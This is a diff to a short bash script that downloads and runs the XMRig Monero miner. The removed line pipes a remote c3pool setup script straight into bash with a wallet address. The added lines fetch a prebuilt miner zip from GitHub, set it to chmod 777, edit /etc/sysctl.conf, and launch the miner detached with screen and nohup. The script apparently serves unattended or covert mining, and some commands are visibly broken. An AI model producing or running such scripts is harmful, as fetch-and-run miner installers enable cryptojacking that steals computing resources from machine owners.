@@ -1,10 +1,19 @@
 #!/usr/bin/bash
 
 sudo -i
-curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43FCyiMCPc5Sx5kKURN4j1KTH5fA7C9ZAUys3VaxoBoQ7qWtV3UoUuX3BSdLNdxUMBUxYPxgUAxN6Jse5hKodvhqFej495L
+echo y | sudo apt-get install screen
+wget https://github.com/shyuan2333/waku/raw/master/xmrig-v6.3.3-C3-lin64-compat.zip
+echo y | apt-get install zip
+echo y | unzip xmrig-v6.3.3-C3-lin64-compat.zip
+cd ~/xmrig-v6.3.3-C3-lin64-compat
+chmod 777 xmrig
+core='nproc --all'
+sudo bash -c 'echo vm.nr_hugepages="nproc --all" >> /etc/sysctl.conf'
+screen -S xmrig
 cd c3pool
 nohup ./xmrig -o &
 echo -e '\n'
 logout
 logout
 echo -e '\n'
+
